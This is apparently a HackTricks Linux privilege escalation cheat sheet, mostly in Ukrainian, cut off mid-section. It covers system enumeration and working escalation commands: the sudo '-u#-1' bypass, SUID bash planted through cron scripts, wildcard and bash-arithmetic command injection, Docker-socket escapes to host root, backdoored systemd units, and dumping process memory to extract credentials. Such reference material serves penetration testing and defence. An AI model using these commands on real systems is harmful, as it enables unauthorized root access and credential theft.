# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Почнемо збирати інформацію про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо ви **маєте права запису в будь-який каталог всередині змінної `PATH`** ви можете підмінити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про оточення

Чи є в змінних оточення цікава інформація, паролі або API-ключі?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і чи існує exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список уразливих версій ядра і деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі уразливі версії ядра з цього сайту, ви можете зробити так:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти шукати kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустити на жертві — перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію kernel у Google**, можливо ваша версія kernel вказана в якомусь kernel exploit і тоді ви будете впевнені, що цей exploit дійсний.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo версія

На основі вразливих версій sudo, які з'являються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: перевірка підпису не вдалася

Перевірте **smasher2 box of HTB** для **прикладу** того, як цю vuln можна експлуатувати.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткове збирання інформації про систему
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічити можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви перебуваєте всередині docker container ви можете спробувати втекти з нього:


{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і що не змонтовано**, де і чому. Якщо щось не змонтовано, ви можете спробувати змонтувати це і перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічіть корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи **будь-який компілятор встановлений**. Це корисно, якщо вам потрібно використовувати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна експлуатувати для підвищення привілеїв…\
Рекомендується вручну перевіряти версії найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ по SSH до машини, ви також можете використовувати **openVAS** для перевірки застарілого та вразливого програмного забезпечення, встановленого в системі.

> [!NOTE] > _Зауважте, що ці команди покажуть велику кількість інформації, яка в більшості випадків буде марною, тому рекомендується використовувати спеціальні додатки, такі як OpenVAS або подібні, які перевіряють, чи версія встановленого програмного забезпечення вразлива до відомих exploits_

## Процеси

Погляньте, які саме **процеси** виконуються, і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (можливо, tomcat запущено від імені root?).
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте чи не запущені [**electron/cef/chromium debuggers** працюють, їх можна використати для підвищення привілеїв](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевіряйте свої привілеї над binaries процесів**, можливо, ви зможете перезаписати чийсь.

### Process monitoring

Ви можете використовувати інструменти, такі як [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисним для виявлення вразливих процесів, які виконуються часто або коли задовольняється певний набір умов.

### Process memory

Деякі сервіси на сервері зберігають **credentials у відкритому тексті в пам'яті**.\
Зазвичай вам потрібні **root privileges** щоб читати пам'ять процесів, що належать іншим користувачам, тому це зазвичай корисно, коли ви вже root і хочете знайти більше credentials.\
Проте пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які належать вам**.

> [!WARNING]
> Зауважте, що нині більшість машин **за замовчуванням не дозволяють ptrace**, тож ви не можете дампити інші процеси, що належать вашому непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: усі процеси можуть бути відлагоджені, якщо вони мають однаковий uid. Це класичний спосіб роботи ptrace.
> - **kernel.yama.ptrace_scope = 1**: відлагоджувати можна лише батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: тільки admin може використовувати ptrace, оскільки це вимагає можливості CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: жодні процеси не можуть бути трасовані ptrace. Після встановлення потрібне перезавантаження, щоб знову увімкнути трасування.

#### GDB

Якщо у вас є доступ до пам'яті сервісу FTP (наприклад), ви можете отримати Heap і шукати всередині нього credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого PID, **maps показують, як пам'ять відображається у віртуальному адресному просторі цього процесу**; вони також показують **права доступу кожного відображеного регіону**. Псевдофайл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми дізнаємося, які **регіони пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **seek у файл mem і dump усі регіони, доступні для читання** в окремий файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до системної **фізичної** пам'яті, а не до віртуальної пам'яті. Віртуальний адресний простір ядра можна отримати за допомогою /dev/kmem.\
Зазвичай, `/dev/mem` читабельний лише для **root** та групи **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це переосмислення для Linux класичного інструменту ProcDump із набору інструментів Sysinternals для Windows. Отримати його можна за адресою [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб зробити dump пам'яті процесу, можна використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимоги root і зробити dump процесу, що належить вам
- Script A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump the process (див. попередні розділи, щоб знайти різні способи dump the memory of a process) і шукати credentials у memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) will **викрадати облікові дані у відкритому тексті з пам'яті** та з деяких **відомих файлів**. Для коректної роботи потрібні привілеї root.

| Об'єкт                                            | Ім'я процесу         |
| ------------------------------------------------- | -------------------- |
| GDM пароль (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (активні FTP-з'єднання)                    | vsftpd               |
| Apache2 (активні HTTP Basic Auth сесії)           | apache2              |
| OpenSSH (активні SSH-сеанси - використання sudo)  | sshd:                |

#### Пошук регулярних виразів/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron jobs

Перевірте, чи є якісь заплановані завдання вразливими. Можливо, можна скористатися тим, що скрипт виконується від root (wildcard vuln? чи можна змінювати файли, які використовує root? використати symlinks? створити специфічні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron шлях

Наприклад, у файлі _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо в цьому crontab користувач root намагається виконати якусь команду або скрипт без встановленого PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді можна отримати root shell, використовуючи:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, який використовує скрипт з wildcard (Wildcard Injection)

Якщо скрипт, який виконується від імені root, містить “**\***” у команді, це можна використати, щоб спричинити небажані дії (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху, як-от** _**/some/path/\***_ **, він не є вразливим (навіть** _**./\***_ **- ні).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion і command substitution перед arithmetic evaluation у ((...)), $((...)) та let. Якщо root cron/parser читає ненадійні log поля і підставляє їх в arithmetic context, зловмисник може інжектувати command substitution $(...), який буде виконаний як root під час запуску cron.

- Чому це працює: У Bash розширення відбуваються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Тому значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (виконуючи команду), а потім залишкова цифра `0` використовується для arithmetic, тож скрипт продовжує роботу без помилок.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: Отримайте attacker-controlled текст, записаний у parsed log, так щоб поле, яке виглядає як число, містило command substitution і закінчувалося цифрою. Переконайтеся, що ваша команда не пише в stdout (або перенаправте її), щоб arithmetic залишалося валідним.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **can modify a cron script**, що виконується як root, ви дуже легко можете отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо script, що виконується від імені root, використовує **directory where you have full access**, можливо, має сенс видалити цю папку і **create a symlink folder to another one**, що вказуватиме на script, контрольований вами.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Часті cron jobs

Ви можете моніторити процеси, щоб шукати процеси, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і escalate privileges.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **відсортувати за командами, які виконуються найрідше** і видалити команди, які були виконані найчастіше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (цей інструмент буде моніторити та перераховувати кожен процес, що запускається).

### Невидимі cron jobs

Можна створити cronjob, **додавши символ повернення каретки після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Сервіси

### Доступні для запису _.service_ файли

Перевірте, чи можете записати будь-який `.service` файл, якщо можете, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor коли** служба **запускається**, **перезапускається** або **зупиняється** (можливо, доведеться почекати, поки машина не перезавантажиться).\
Наприклад, створіть ваш backdoor всередині .service файлу з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **права запису над бінарними файлами, які виконуються сервісами**, ви можете змінити їх на backdoors, тож коли сервіси будуть повторно виконані, backdoors будуть виконані.

### systemd PATH - Відносні шляхи

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** в будь-яку з папок цього шляху, можливо, ви зможете **escalate privileges**. Потрібно шукати **відносні шляхи, які використовуються у файлах конфігурації сервісів**, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **тим самим ім'ям, що й бінарний файл за відносним шляхом** всередині папки PATH systemd, у яку ви маєте права запису, і коли службу попросять виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконаний** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете використовувати `sudo -l`).

**Дізнайтесь більше про служби за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit files, назви яких закінчуються на `**.timer**`, які контролюють `**.service**` файли або події. **Таймери** можуть використовуватися як альтернатива cron, оскільки вони мають вбудовану підтримку календарних часових подій і монотонних часових подій та можуть запускатися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Таймери, доступні для запису

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі одиниці systemd.unit (наприклад `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Unit, яке буде активовано, коли цей timer сплине. Аргумент — це ім'я unit, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням встановлюється на сервіс з тією ж назвою, що й timer unit, за винятком суфіксу. (Див. вище.) Рекомендується, щоб ім'я unit, яке активується, і ім'я timer unit були однаковими, за винятком суфіксу.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує бінарний файл, який можна записувати**
- Знайти systemd unit, який **виконує відносний шлях** і над яким у вас є **права запису** у **systemd PATH** (щоб видавати себе за цей виконуваний файл)

**Learn more about timers with `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні права root і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зауважте, що **таймер** **активується**, створенням символічного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) дозволяють **обмін між процесами** на тих самих або різних машинах у клієнт-серверній моделі. Вони використовують стандартні Unix дескриптори для міжкомп'ютерного зв'язку і налаштовуються через `.socket` файли.

Sockets can be configured using `.socket` files.

**Дізнайтесь більше про сокети за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції відрізняються, але узагальнення використовується, щоб **вказати, де буде прослуховуватися** сокет (шлях до AF_UNIX сокет-файлу, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання створюється екземпляр service unit і лише сокет з'єднання передається йому. Якщо **false**, всі прослуховуючі сокети самі **передаються до запущеної service unit**, і лише одна service unit створюється для всіх з'єднань. Це значення ігнорується для datagram сокетів і FIFO, де єдина service unit безумовно обробляє весь вхідний трафік. **За замовчуванням false**. З міркувань продуктивності рекомендується писати нові демони так, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймає один або кілька рядків команд, які **виконуються перед** або **після** створення та прив'язки прослуховуючих **сокетів**/FIFO відповідно. Перший токен командного рядка має бути абсолютним іменем файлу, за яким слідують аргументи для процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, що **виконуються перед** або **після** закриття та видалення прослуховуючих **сокетів**/FIFO відповідно.
- `Service`: Вказує ім'я **service** unit, яку **активувати** при **вхідному трафіку**. Ця настройка дозволена лише для сокетів з Accept=no. За замовчуванням використовується сервіс з тим самим ім'ям, що й сокет (з відповідною заміною суфікса). У більшості випадків використання цієї опції не є необхідним.

### Записувані `.socket` файли

Якщо ви знайдете **доступний для запису** `.socket` файл, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано перед створенням сокета. Тому, **ймовірно, доведеться зачекати до перезавантаження машини.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Записувані сокети

Якщо ви **виявите будь-який socket, доступний для запису** (_тут мається на увазі Unix Sockets, а не конфігураційні `.socket` файли_), то **ви можете комунікувати** з цим socket і можливо експлуатувати вразливість.

### Перелічення Unix Sockets
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зауважте, що можуть бути деякі **sockets listening for HTTP** запити (_я не маю на увазі .socket files, а файли, що виконують роль unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо сокет **відповідає на HTTP** запит, то ви можете **спілкуватися** з ним і, можливо, **експлуатувати якусь вразливість**.

### Docker сокет доступний для запису

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є права запису до Docker сокета, ви можете escalate privileges, використовуючи такі команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з доступом root до файлової системи хоста.

#### **Використання Docker API безпосередньо**

Якщо Docker CLI недоступний, Docker socket все ще можна використати через Docker API та команди `curl`.

1.  **List Docker Images:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит для створення контейнера, який монтує корінь файлової системи хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` для встановлення з'єднання з контейнером, що дозволить виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з'єднання через `socat` ви зможете виконувати команди безпосередньо в контейнері з root-доступом до файлової системи хоста.

### Інше

Зверніть увагу, що якщо у вас є права на запис у docker socket через те, що ви **в середині групи `docker`**, у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API прослуховує порт** ви також можете його скомпрометувати](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **more ways to break out from docker or abuse it to escalate privileges** у:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви виявите, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система міжпроцесної взаємодії (inter-Process Communication, `IPC`), яка дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена для сучасних Linux-систем, вона забезпечує надійну структуру для різних форм комунікації між застосунками.

Система універсальна: вона підтримує базовий IPC, що покращує обмін даними між процесами, нагадуючи розширені UNIX domain sockets. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від Bluetooth daemon про вхідний дзвінок може змусити музичний плеєр приглушити звук. Також D-Bus підтримує систему віддалених об'єктів, що спрощує запити сервісів і виклики методів між додатками, полегшуючи процеси, які раніше були складними.

D-Bus працює за моделлю дозволити/заборонити (allow/deny), керуючи дозволами на повідомлення (виклики методів, емісія сигналів тощо) на основі сукупного ефекту правил політики, які співпадають. Ці політики визначають взаємодії з шиною і можуть потенційно дозволити privilege escalation через експлуатацію таких дозволів.

Приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf` показаний, де вказані дозволи для користувача root власнувати, надсилати та отримувати повідомлення від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не покритий іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як виконувати енумерацію та експлуатувати комунікацію D-Bus тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди корисно виконувати енумерацію мережі й визначати місце машини в ній.

### Загальна енумерація
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо зможете, можливо, вдасться отримати деякі credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Перевірте, **who** ви є, які **privileges** у вас є, які **users** є в системах, які можуть **login** і які мають **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux постраждали від помилки, яка дозволяє користувачам з **UID > INT_MAX** підвищити привілеї. Детальніше: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) і [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатуйте** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи є ви **членом якоїсь групи**, яка могла б надати вам права root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
